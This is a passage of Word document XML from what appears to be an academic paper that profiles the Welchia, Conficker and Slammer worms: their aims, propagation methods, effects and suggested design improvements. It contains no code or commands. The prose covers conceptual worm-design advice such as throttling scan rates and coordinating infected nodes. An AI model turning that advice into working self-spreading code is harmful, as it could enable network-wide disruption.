        <w:t xml:space="preserve"> systems to spread to.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00EB47D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Once running on a target vulnerable server it killed the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lovsan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm and deleted its code</w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">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if it existed, and </w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">then </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">installed the Microsoft patch to close the vulnerability.  The worm failed to fully clean the infected system as it left Windows OS registry entries from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Lovsan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> worm intact.  Because</w:t>
      </w:r>
      <w:r w:rsidR="00F54241">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the worm</w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'s aggressive behavior in searching for targets</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003A2DAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> caused a lot of network traffic congestion.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00656350" w:rsidRDefault="00EB47D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worm did succeed in finding unpatched systems and closing the public vulnerability.  The registry entries were harmless, but could have allowed for automatic execution of a future worm variant that knew they were there.  Also the extra network congestion simply caused further issues for network operators.  In one instance Diebold ATMs running the Windows OS were infected and began to aggressively scan internal financial networks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F25BB9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Poulsen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F25BB9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2003</w:t>
      </w:r>
      <w:r>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Intrusion </w:t>
      </w:r>
      <w:r w:rsidR="00C06CA9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>prevention</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> systems flagged this activity and automatically disconnected the ATMs requiring a technician to </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">physically </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>visit the machine to repair it be</w:t>
      </w:r>
      <w:r w:rsidR="00656350">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fore they could be used again.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0065635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Improvements would be complete cleanup of the malicious worm including the registry entries as well as a limiter or governor on network traffic especially during propagation to local subnets.  Another improvement would be local peer to peer communication with other infected </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>nodes in case they crash to send a signal to stop propagating.  This would allow for “fallen comrade” behavior that would reduce unexpected side effects on the entire network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc321736786"/>
      <w:r w:rsidRPr="00861880">
        <w:t xml:space="preserve">Worm Name:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Conficker</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
      <w:proofErr w:type="spellEnd"/>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Aliases:  W32.Downadup.C; W32.Downadup</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00022FDF" w:rsidRDefault="00022FD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Sources:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00022FDF" w:rsidRDefault="00CB26A3" w:rsidP="00022FDF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00022FDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00022FDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Conficker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00022FDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Worm Hits University of Utah Computers.” Associated Press. Salt Lake City. 12 Apr 2009.  Accessed: 7 Sep 2011.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00022FDF" w:rsidRDefault="00CB26A3" w:rsidP="00022FDF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00022FDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“W32.Downadup.C.” Symantec Security Response. 6 Apr 2009. Accessed: 1 Nov 2011. symantec.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00022FD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sidR="00203E55">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Malicious. </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Steal login credentials on Windows machines for further future data theft.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00022FDF" w:rsidP="00022FD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Methods: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It exploited the “Microsoft Windows Server Service RPC Handling Remote Code Execution Vulnerability” which was a weakness in Windows XP and Server 2003.  By connecting to the service over the network it was able to get the target computer to execute the worm code.  It scans a network for vulnerable hosts and selectively queries hosts so as to help mask its traffic to avoid detection on the network.  In addition it will take advantage of Universal Plug and Play on network routers to get them to pass it through NAT type devices.  Another method is infecting executable files on network shares</w:t>
      </w:r>
      <w:r w:rsidR="00D363AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> gaining access</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by dictionary attack on user passwords.  In addition it will also copy itself to removable drives.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D363AE"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B6D7A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>It c</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">aused users to be locked out of their accounts due to too many failed login attempts by the worm.  Disables Windows Update service in the operating system to prevent </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">automatic updates from patching the exploit.  In addition it also disabled Windows operating system alert notifications </w:t>
      </w:r>
      <w:r w:rsidR="000D66CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>about</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> automatic updates </w:t>
      </w:r>
      <w:r w:rsidR="000D66CD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>being</w:t>
      </w:r>
      <w:r w:rsidR="00951F95">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> disabled thus hiding from</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the user.  It did not disable any existing anti-virus software, but it did disable any DNS requests which could get an updated definition and detect and remove the worm.  The worm hid itself deeply in the registry by using a list of valid looking keys and randomly choosing them which made complete removal difficult.  In addition it kills any processes that had a name that was similar to known Microsoft update patches or registry editing tools which could be used to remove it.  On or after April 1, 2009 the worm code would trigger a download</w:t>
      </w:r>
      <w:r w:rsidR="00196115">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> malicious payload instructions from a web site.  Based on the current date and time an algorithm would dynamically generate a specific domain name to attempt to access.  This allowed the worm to continue to receive instructions even if authorities took down some of the existing domain names it used the day before.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00203E5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worm’s purpose was to infect many systems and accept commands from dynamically changing control servers.  It was very successful in achieving this goal and once it had taking over a system it was very difficult to remove it.  Since it disabled automatic updates and blocked network access to virus definition updates administrators had to manually go to each machine to execute removal tools.  In addition system backups like Windows System Restore had to be cleared out as well to ensure the worm wasn’t accidentally restored from a backup.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="005A721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worm’s aggression in attempting passwords resulted in accounts becoming locked out very quickly.  Even if one user’s machine wasn’t compromised their account could still get locked out because another user’s machine on the same Windows Active Directory domain network was compromised and trying all other known user accounts as well.  The worm did leave the vulnerability unpatched which would have allowed a benevolent worm a chance to execute removal tools on the system had such a worm existed.  Had the malicious worm been </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>less aggressive in attempting logins it would have probably gone unnoticed for a longer period of time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00577DF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Since </w:t>
      </w:r>
      <w:r w:rsidR="00177142">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Microsoft </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Windows XP SP3 software firewalls have now been included in the Microsoft OS.  Since many people do not need to share network files or printers by default on their computer having the service firewalled helps to prevent this type of attack.  Although many companies and organizations have external facing perimeter firewalls for their network once inside many machines did not</w:t>
      </w:r>
      <w:r w:rsidR="00764BE1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> have any protection</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  Because of this worm some companies have now turned on the OS software firewall by default as an additional defense.  This assists in preventing an outbreak even if someone brings in a laptop to the office which has been infected as other internal systems will have the service firewalled.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00400D80">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc321736787"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Worm Name:  Slammer</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>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Aliases:  Sapphire</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00171ECC" w:rsidRDefault="00171EC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Sources:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00171ECC" w:rsidRDefault="00CB26A3" w:rsidP="00171ECC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00171ECC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Moore, David. “Inside the Slammer Worm.” Security &amp; Privacy Magazine. IEEE: Jul 2003. Accessed: 23 Jan 2012. &lt;http://ieeexplore.ieee.org/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D45A8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Unknown.  No malicious payload was included in the worm nor any download mechanism for future payloads.  Possibly just to test how fast it could spread or perhaps to cause general denial of service on the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D45A8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Methods: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Exploited buffer overflow vulnerability in MS SQL Server and SQL Desktop edition by connecting to open ports over a network.  Once on a system it immediately began scann</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing for other hosts by random</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ly picking IP addresses.  This resulted in </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">an exponential growth at the beginning which eventually reached a more fixed speed as the number of hosts to compromise </w:t>
      </w:r>
      <w:r w:rsidR="002F78C1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> reduced.  At one point it had a </w:t>
      </w:r>
      <w:r w:rsidR="002F78C1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">target scanning rate </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>of 55 million per second which allowed it to spread very quickly across thousands of machines.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="004922E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virus was able to infect tens of thousands of systems within just an hour of its release onto the Internet.  It had no defined malicious payload but did demonstrate the fastest spreading worm known to date.  Many network administrators quickly blocked the MS SQL Server port on their firewalls since there was no need to have it available on the public Internet in most cases.  This lead to new standard practices of using firewalls to keep database servers off the Internet.  However by this time almost all hosts the could be infected were infected.  Due to the network traffic caused by the worm some </w:t>
      </w:r>
      <w:r w:rsidR="006B5F98">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">emergency </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">911 and </w:t>
      </w:r>
      <w:r w:rsidR="002F2AFA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">bank </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ATM systems failed.  The worm effectively caused a denial of service for many networks on the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001805FA" w:rsidRDefault="00A701F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Because it spread itself so quickly and performed such aggressive networks scans eventually the spreading of the worm slowed down due to insufficient bandwidth remaining on the networks.  The worm has a small network packet probe size of just 404 bytes but with so many computers sending out probes it </w:t>
      </w:r>
      <w:r w:rsidR="00ED65C3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>became limited by the</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> bandwidth.  The network saturation caused by the probes caused some parts of the Internet backbone to become unusable and brought smaller networks down due to the load.  Since Slammer exploited a flaw in SQL Server’s UDP listening port it didn’t have the latency or overhead of waiting on TCP connection handshakes.  It could simply send out the UDP packet and keep going on to other hosts even if the sen</w:t>
      </w:r>
      <w:r w:rsidR="001805FA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t packet never got a response.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="001805F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An improvement would have been to limit the scan rate or at least only quickly probe internal networks and use a slower scan rate for external networks to the Internet.  Additionally </w:t>
      </w:r>
